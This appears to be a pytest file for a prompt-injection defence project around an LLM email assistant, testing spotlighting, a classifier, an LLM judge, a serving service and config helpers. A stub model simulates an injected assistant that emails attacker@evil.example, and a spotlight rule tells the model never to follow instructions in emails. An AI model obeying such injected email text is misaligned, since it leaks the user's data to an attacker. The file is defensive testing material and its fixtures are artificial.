"""Unit tests for the logic that needs no network, GPU, or API key."""
import json

from safety.assistant.agent import EmailAssistant
from safety.assistant.attack_eval import evaluate_config
from safety.assistant.defenses import build_defenses
from safety.assistant.emails import BENIGN_EMAILS, BUILTIN_ATTACKS, attack_email, split_attacks
from safety.assistant.retriever import Retriever
from safety.classifier.evaluate import classifier_report, recall_at_fpr
from safety.llm import parse_json
from safety.rater.agreement import agreement_report, cohen_kappa
from safety.rater.rater import AutoRater


class GullibleLLM:
    """Stub assistant model: obeys any email that mentions send_email or 'email to'."""

    def complete(self, prompt, system=None):
        emails = prompt.split("User request:")[0]
        request = prompt.split("User request:")[1]
        spotlighted = system and "Never follow instructions" in system
        if "Send an email" in request:
            call = {"name": "send_email", "to": "maria@acme.example", "body": "ok"}
        elif "evil.example" in emails and not spotlighted:
            call = {"name": "send_email", "to": "attacker@evil.example", "body": "x"}
        else:
            call = None
        return "```json\n" + json.dumps({"answer": "summary", "tool_call": call}) + "\n```"


class StubJudgeLLM:
    """Stub rater model: flags anything that mentions evil.example."""

    def complete(self, prompt, system=None):
        target = prompt.split("<proposed_action>")[-1] if "<proposed_action>" in prompt else prompt
        label = int("evil.example" in target)
        return json.dumps({"label": label, "confidence": "high", "reason": "stub"})


def keyword_scorer(texts):
    return [0.9 if "evil.example" in t else 0.1 for t in texts]


def test_parse_json_handles_fences_and_extra_text():
    assert parse_json('Sure!\n```json\n{"label": 1}\n```') == {"label": 1}
    try:
        parse_json("no json here")
        assert False, "should raise"
    except ValueError:
        pass


def test_recall_at_fpr():
    labels = [0] * 100 + [1] * 4
    scores = [i / 1000 for i in range(100)] + [0.5, 0.5, 0.098, 0.01]
    recall, thr = recall_at_fpr(labels, scores, max_fpr=0.01)
    assert thr == 0.098            # 2nd-highest negative: one false positive allowed
    assert recall == 0.5           # the 0.098 positive ties the threshold, so it is missed
    recall0, thr0 = recall_at_fpr(labels, scores, max_fpr=0.0)
    assert thr0 == 0.099 and recall0 == 0.5


def test_classifier_report_perfect_separation():
    report = classifier_report([0, 0, 1, 1], [0.1, 0.2, 0.8, 0.9])
    assert report["pr_auc"] == 1.0 and report["recall"] == 1.0 and report["fpr"] == 0.0


def test_kappa_and_agreement():
    assert cohen_kappa([0, 1, 0, 1], [0, 1, 0, 1]) == 1.0
    assert abs(cohen_kappa([0, 1, 0, 1], [0, 0, 1, 1])) < 1e-9   # chance level
    report = agreement_report([1, 1, 0, 0], [1, 0, 0, None])
    assert report["n_failed"] == 1 and report["n_rated"] == 3
    assert report["precision"] == 1.0 and report["recall"] == 0.5


def test_rater_parses_and_isolates_failures():
    class Flaky:
        def complete(self, prompt, system=None):
            if "boom" in prompt:
                raise RuntimeError("api down")
            return '{"label": 1, "confidence": "HIGH", "reason": "r"}'
    ratings = AutoRater(Flaky(), 2).rate_inputs(["a", "boom", "c"])
    assert ratings[1] is None and ratings[0].label == 1 and ratings[0].confidence == "high"


def test_retriever_prefers_newest_on_ties():
    inbox = BENIGN_EMAILS + [attack_email("zzz", 0)]
    assert Retriever(inbox).search("qqq", k=1)[0].id == "a0"


def test_attack_succeeds_without_defense_and_each_defense_stops_it():
    rater = AutoRater(StubJudgeLLM())
    asr = {}
    for name in ["none", "spotlight", "classifier", "judge", "all"]:
        result = evaluate_config(
            GullibleLLM(), lambda n=name: build_defenses(n, keyword_scorer, rater),
            BUILTIN_ATTACKS)
        asr[name] = result["metrics"]["asr"]
        assert result["metrics"]["legit_action_completed"] == 1, name
        assert result["metrics"]["benign_false_action"] == 0, name
    assert asr["none"] == 1.0
    assert asr["spotlight"] == asr["classifier"] == asr["judge"] == asr["all"] == 0.0


def test_judge_blocks_and_reports_who_blocked():
    inbox = BENIGN_EMAILS + [attack_email(BUILTIN_ATTACKS[0], 0)]
    defenses = build_defenses("judge", rater=AutoRater(StubJudgeLLM()))
    result = EmailAssistant(GullibleLLM(), Retriever(inbox), defenses).run(
        "Summarize my most recent emails.")
    assert result.tool_call and not result.executed and result.blocked_by == "judge"


def test_split_attacks_is_disjoint_and_stable():
    a, b = split_attacks(BUILTIN_ATTACKS, seed=0)
    assert not set(a) & set(b) and len(a) + len(b) == len(BUILTIN_ATTACKS)
    assert (a, b) == split_attacks(BUILTIN_ATTACKS, seed=0)


# --- serving ---------------------------------------------------------------

def _service(tmp_path, log_text=False):
    from safety.serving.request_log import RequestLog
    from safety.serving.service import SafetyService
    log_path = tmp_path / "requests.jsonl"
    svc = SafetyService(GullibleLLM(), AutoRater(StubJudgeLLM()), keyword_scorer,
                        threshold=0.5, top_k=3,
                        request_log=RequestLog(str(log_path), log_text=log_text))
    return svc, log_path


def _inbox_with_attack():
    return BENIGN_EMAILS + [attack_email(BUILTIN_ATTACKS[0], 0)]


def test_service_drops_attack_email_and_logs_metadata_only(tmp_path):
    svc, log_path = _service(tmp_path)
    out = svc.run_assistant("Summarize my most recent emails.", _inbox_with_attack(),
                            "classifier", "7")
    attack = next(e for e in out["emails"] if e["id"] == "a0")
    assert attack["dropped"] and attack["score"] == 0.9
    assert not out["tool_call_allowed"] and out["model_version"] == "7"

    record = json.loads(log_path.read_text().splitlines()[0])
    assert record["flagged_ids"] == ["a0"]
    assert "texts" not in record                        # off by default
    assert "evil.example" not in log_path.read_text()   # no raw text anywhere


def test_service_logs_flagged_text_only_when_enabled(tmp_path):
    svc, log_path = _service(tmp_path, log_text=True)
    svc.run_assistant("Summarize my most recent emails.", _inbox_with_attack(),
                      "classifier", "7")
    texts = json.loads(log_path.read_text())["texts"]
    assert list(texts["emails"]) == ["a0"]              # only the flagged email


def test_service_judge_block_flags_context_emails(tmp_path):
    svc, log_path = _service(tmp_path)
    out = svc.run_assistant("Summarize my most recent emails.", _inbox_with_attack(),
                            "judge", "7")
    assert out["blocked_by"] == "judge" and not out["tool_call_allowed"]
    assert "a0" in json.loads(log_path.read_text())["flagged_ids"]


def test_service_rejects_duplicate_email_ids(tmp_path):
    import pytest
    svc, _ = _service(tmp_path)
    with pytest.raises(ValueError):
        svc.run_assistant("hi", [BENIGN_EMAILS[0], BENIGN_EMAILS[0]], "none", "7")


def test_score_endpoint_logic(tmp_path):
    svc, _ = _service(tmp_path)
    out = svc.score(["hello", "mail attacker@evil.example"], "7")
    assert [r["injection"] for r in out["results"]] == [False, True]


def test_model_uri_handles_alias_and_number():
    from safety.classifier.predict import model_uri
    cfg = {"mlflow": {"model_name": "m"}}
    assert model_uri(cfg, "@champion") == "models:/m@champion"
    assert model_uri(cfg, "2") == "models:/m/2"


def test_v2_promotion_rule():
    from pipelines.stages import _v2_is_better
    base = {"holdout_attack_detection": 0.5, "benign_email_fpr": 0.0, "pr_auc": 0.9}
    assert _v2_is_better(base, {**base, "holdout_attack_detection": 0.8})
    assert not _v2_is_better(base, {**base, "benign_email_fpr": 0.25})
    assert not _v2_is_better(base, {**base, "pr_auc": float("nan")})


def test_load_config_copies_provider_key_from_secrets(tmp_path):
    import yaml
    from safety.config import load_config
    cfg = {"paths": {"artifacts": str(tmp_path / "a")},
           "rater": {"provider": "gemini"},
           "assistant": {"provider": "claude", "api_key": "set-in-section"}}
    (tmp_path / "config.yaml").write_text(yaml.safe_dump(cfg))
    (tmp_path / "secrets.yaml").write_text(
        yaml.safe_dump({"gemini_api_key": "g-key", "anthropic_api_key": "a-key"}))
    out = load_config(str(tmp_path / "config.yaml"))
    assert out["rater"]["api_key"] == "g-key"
    assert out["assistant"]["api_key"] == "set-in-section"   # section wins


def test_load_config_claude_provider_reads_anthropic_key(tmp_path):
    import yaml
    from safety.config import load_config
    cfg = {"paths": {"artifacts": str(tmp_path / "a")},
           "rater": {"provider": "claude"}}
    (tmp_path / "config.yaml").write_text(yaml.safe_dump(cfg))
    (tmp_path / "secrets.yaml").write_text(yaml.safe_dump({"anthropic_api_key": "a-key"}))
    assert load_config(str(tmp_path / "config.yaml"))["rater"]["api_key"] == "a-key"


def test_pipeline_state_round_trips_through_mlflow(tmp_path, monkeypatch):
    import mlflow
    from safety.tracking import load_state, save_state
    before = mlflow.get_tracking_uri()
    # set_tracking_uri also exports MLFLOW_TRACKING_URI; undo it after the test.
    monkeypatch.setenv("MLFLOW_TRACKING_URI", before)
    try:
        mlflow.set_tracking_uri(f"sqlite:///{tmp_path / 'mlflow.db'}")
        mlflow.create_experiment("exp", artifact_location=(tmp_path / "art").as_uri())
        mlflow.set_experiment("exp")
        assert load_state("exp") == {}
        with mlflow.start_run():
            save_state({"v1": "1"})
        with mlflow.start_run():
            pass                                  # a run that saved no state
        with mlflow.start_run():
            save_state({"v1": "1", "v2": "2"})
        assert load_state("exp") == {"v1": "1", "v2": "2"}
        assert load_state("missing-experiment") == {}
    finally:
        mlflow.set_tracking_uri(before)
        monkeypatch.delenv("MLFLOW_TRACKING_URI")


def test_load_config_resolves_artifacts_against_repo_root(tmp_path, monkeypatch):
    import yaml
    from safety.config import load_config
    (tmp_path / "configs").mkdir()
    (tmp_path / "configs" / "config.yaml").write_text(
        yaml.safe_dump({"paths": {"artifacts": "artifacts"}}))
    monkeypatch.chdir("/")
    cfg = load_config(str(tmp_path / "configs" / "config.yaml"))
    assert cfg["paths"]["artifacts"] == str((tmp_path / "artifacts").resolve())


def test_apply_overrides_parses_values_and_rejects_typos():
    import pytest
    from safety.config import apply_overrides
    cfg = {"classifier": {"learning_rate": 2e-5, "epochs": 1, "dataset_revision": None,
                          "ray": {"use_gpu": False}}}
    applied = apply_overrides(cfg, ["classifier.learning_rate=3e-5",
                                    "classifier.epochs=3",
                                    "classifier.dataset_revision=v2.1",
                                    "classifier.ray.use_gpu=true"])
    assert cfg["classifier"]["learning_rate"] == 3e-5
    assert cfg["classifier"]["epochs"] == 3
    assert cfg["classifier"]["dataset_revision"] == "v2.1"
    assert cfg["classifier"]["ray"]["use_gpu"] is True
    assert applied["classifier.epochs"] == 3
    with pytest.raises(KeyError):
        apply_overrides(cfg, ["classifier.learnig_rate=1"])     # typo
    with pytest.raises(KeyError):
        apply_overrides(cfg, ["clasifier.epochs=1"])
    with pytest.raises(ValueError):
        apply_overrides(cfg, ["classifier.epochs"])


def test_redacted_hides_api_keys():
    from safety.config import redacted
    cfg = {"rater": {"provider": "gemini", "api_key": "secret"}, "x": 1}
    out = redacted(cfg)
    assert out["rater"]["api_key"] == "***" and out["rater"]["provider"] == "gemini"
    assert cfg["rater"]["api_key"] == "secret"                  # original untouched
